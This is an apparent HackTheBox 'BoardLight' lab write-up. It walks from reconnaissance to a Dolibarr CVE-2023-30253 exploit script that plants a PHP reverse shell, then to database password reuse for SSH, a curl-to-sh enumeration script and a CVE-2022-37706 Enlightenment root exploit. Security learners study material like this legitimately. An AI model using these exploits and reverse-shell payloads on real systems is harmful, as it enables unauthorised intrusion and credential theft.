---
title: HackTheBox - BoardLight
date: Fri Aug 16 12:47:08 AM EDT 2024
categories: [PentestNotes]
tags: [linux,dns,llm,htb,htb_season_5]
---

## Recon

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.11:22
Open 10.10.11.11:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.11
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-27 19:57 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:57
Completed Parallel DNS resolution of 1 host. at 19:57, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:57
Scanning 10.10.11.11 [2 ports]
Discovered open port 80/tcp on 10.10.11.11
Discovered open port 22/tcp on 10.10.11.11
Completed Connect Scan at 19:57, 0.40s elapsed (2 total ports)
Initiating Service scan at 19:57
Scanning 2 services on 10.10.11.11
Completed Service scan at 19:57, 7.35s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.11.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 4.34s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.65s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Nmap scan report for 10.10.11.11
Host is up, received user-set (0.40s latency).
Scanned at 2024-05-27 19:57:06 UTC for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 062d3b851059ff7366277f0eae03eaf4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 5903dc52873a359934447433783135fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab1338e43ee024b46938a9638238ddf4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
```
</details>

{::options parse_block_html="false" /}

## HTTP (80)

![Pasted image 20240527235805.png](/assets/images/Season 5/BoardLight/Pasted image 20240527235805.png)

```bash
└─$ feroxbuster -u http://10.10.11.11/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -d 1 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.11/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        5l       23w     1217c http://10.10.11.11/images/location-white.png
200      GET        7l       48w     3995c http://10.10.11.11/images/d-5.png
200      GET      294l      633w     9209c http://10.10.11.11/do.php
200      GET        5l       48w     1493c http://10.10.11.11/images/fb.png
200      GET      280l      652w     9100c http://10.10.11.11/about.php
200      GET      517l     1053w    15949c http://10.10.11.11/
200      GET      294l      635w     9426c http://10.10.11.11/contact.php
301      GET        9l       28w      308c http://10.10.11.11/css => http://10.10.11.11/css/
301      GET        9l       28w      311c http://10.10.11.11/images => http://10.10.11.11/images/
301      GET        9l       28w      307c http://10.10.11.11/js => http://10.10.11.11/js/
[####################] - 22s     4761/4761    0s      found:10      errors:2737
[####################] - 21s     4728/4728    223/s   http://10.10.11.11/
```

Hmm.. nothing
We do have email linked  to `board.htb`, let's add it to hosts and try enumerate subdomains.
![Pasted image 20240528000035.png](/assets/images/Season 5/BoardLight/Pasted image 20240528000035.png)

### crm.board.htb

```bash
└─$ domain="board.htb"; ffuf -u "http://$domain" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$domain" -mc all -fl 518
       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response lines: 518
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 222ms]
:: Progress: [4989/4989] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

![Pasted image 20240528000258.png](/assets/images/Season 5/BoardLight/Pasted image 20240528000258.png)

Searching for version we end up with CVE:
https://www.swascan.com/security-advisory-dolibarr-17-0-0/

We are able to login with default credentials:
![Pasted image 20240528000551.png](/assets/images/Season 5/BoardLight/Pasted image 20240528000551.png)

> Creds: `admin:admin`
{: .prompt-tip }

![Pasted image 20240528000734.png](/assets/images/Season 5/BoardLight/Pasted image 20240528000734.png)

### RCE

{::options parse_block_html="true" /}

<details>
<summary markdown="span">CVE-2023-30253.py</summary>

```py
from datetime import datetime
from bs4 import BeautifulSoup as BS
import requests
import random
import string


class Routes:
    BASE = 'http://crm.board.htb'
    LOGIN = BASE + '/index.php'
    CREATE = BASE + '/website/index.php'


IP = '10.10.16.54'
PORT = '4444'
USERNAME = 'admin'
PASSWORD = 'admin'

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))


def get_token(session):
    try:
        return (
            BS(session.get(Routes.LOGIN).text, 'html.parser')
            .find('meta', {'name': 'anti-csrf-newtoken'})
            ['content']
        )
    except:
        raise Exception("Coulnd't get csrf token...")


def login(session, token):
    data = dict(
        token=token,
        actionlogin='login',
        loginfunction='loginfunction',
        username=USERNAME,
        password=PASSWORD
    )
    session.post(Routes.LOGIN, params={'mainmenu': 'home'}, data=data)


def create_website(session, token, website):
    data = dict(
        token=(None, token),
        backtopage=(None, ''),
        dol_openinpopup=(None, ''),
        action=(None, 'addsite'),
        website=(None, 'sgsg'),
        pageid=(None, random.randint(100, 1000)),
        WEBSITE_REF=(None, website),
        WEBSITE_LANG=(None, 'en'),
        WEBSITE_OTHERLANG=(None, ''),
        WEBSITE_DESCRIPTION=(None, ''),
        virtualhost=(None, ''),
        addcontainer=(None, 'Create')
    )
    session.post(Routes.CREATE, files=data)


def create_page(session, token, website, page):
    year, month, day = str(datetime.now().date()).split('-')
    data = dict(
        token=(None, token),
        backtopage=(None, ''),
        dol_openinpopup=(None, ''),
        action=(None, 'addcontainer'),
        website=(None, website),
        pageidbis=(None, '-1'),
        pageid=(None, ''),
        radiocreatefrom=(None, 'checkboxcreatemanually'),
        WEBSITE_TYPE_CONTAINER=(None, 'page'),
        sample=(None, 'empty'),
        WEBSITE_TITLE=(None, page),
        WEBSITE_PAGENAME=(None, page),
        WEBSITE_ALIASALT=(None, ''),
        WEBSITE_DESCRIPTION=(None, ''),
        WEBSITE_IMAGE=(None, ''),
        WEBSITE_KEYWORDS=(None, ''),
        WEBSITE_LANG=(None, '0'),
        WEBSITE_AUTHORALIAS=(None, ''),
        datecreation=(None, f'{month}/{day}/{year}'),
        datecreationday=(None, day),
        datecreationmonth=(None, month),
        datecreationyear=(None, year),
        datecreationhour=(None, 11),
        datecreationmin=(None, 11),
        datecreationsec=(None, 11),
        htmlheader_x=(None, ''),
        htmlheader_y=(None, ''),
        htmlheader=(None, ''),
        addcontainer=(None, 'Create'),
        externalurl=(None, ''),
        grabimages=(None, '1'),
        grabimagesinto=(None, 'root'),
    )
    session.post(Routes.CREATE, files=data)


def edit_page(session, website):
    payload = f'''
    <?PHP shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
    '''
    data = dict(
        token=(None, token),
        backtopage=(None, ''),
        dol_openinpopup=(None, ''),
        action=(None, 'updatesource'),
        website=(None, website),
        pageid=(None, '1'),
        update=(None, 'Save'),
        PAGE_CONTENT_x=(None, '100'),
        PAGE_CONTENT_y=(None, '100'),
        PAGE_CONTENT=(None, payload)
    )
    session.post(Routes.CREATE, files=data)


with requests.Session() as session:
    proxies = {
        'http': '127.0.0.1:8080'
    }
    session.proxies = proxies

    token = get_token(session)
    print(f'[+] Token: {token}')

    login(session, token)
    print(f'[+] Login Success!')

    website = random_string()
    create_website(session, token, website)
    print(f'[+] Website Created!')

    page = random_string()
    create_page(session, token, website, page)
    print(f'[+] Page Created!')

    edit_page(session, website)
    print(f'[+] Payload Injected!')
```

</details>

{::options parse_block_html="false" /}

The fricking app was deleting my website in like 5 seconds so I just created a PoC script.

```bash
└─$ py CVE-2023-30253.py
[+] Token: 2d11f087577b4e3739fa6229c4e6e38d
[+] Login Success!
[+] Website Created!
[+] Page Created!
[+] Payload Injected!
---
└─$ pwncat -lp 4444
[17:37:15] Welcome to pwncat 🐈!                                                          __main__.py:164
[17:40:31] received connection from 10.10.11.11:36888                                          bind.py:84
[17:40:33] 10.10.11.11:36888: registered new host w/ db                                    manager.py:957
(local) pwncat$
(remote) www-data@boardlight:/var/www/html/crm.board.htb/htdocs/website$
```

## Config

```bash
(remote) www-data@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ cat conf.php | grep -v '//'
<?php
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
$dolibarr_main_authentication='dolibarr';

$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';
(remote) www-data@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ ls /home
larissa
```

## SSH

We are able to ssh with database password.

> Creds: `larissa:serverfun2$2023!!`
{: .prompt-tip }

## User.txt

```bash
larissa@boardlight:~$ cat user.txt
ac562f5e61623471ea40e49cbd04ba8b
```

## Privilege Escalation

```bash
larissa@boardlight:/tmp/t$ curl 10.10.16.54/lp.sh | sh | tee lp.log
...
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
...
larissa@boardlight:/tmp/t$ curl 10.10.16.54/exploit_nss.py -Os
larissa@boardlight:/tmp/t$ python3 exploit_nss.py
Traceback (most recent call last):
  File "exploit_nss.py", line 220, in <module>
    assert check_is_vuln(), "target is patched"
AssertionError: target is patched
```

`dirtypipe` also failed to gain root.

If we take a look at suid binaries on system we see some odd files from `enlightenment`:
```bash
larissa@boardlight:/tmp$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```

### Root.txt

Quick google shows us known exploit: https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit

```bash
larissa@boardlight:/tmp$  echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

mount: /dev/../tmp/: cant find in /etc/fstab.
# whoami
root
# cd /root
# ls
root.txt  snap
# cat root.txt
dcddc7a55c4749fbdb1e16b70660e295
```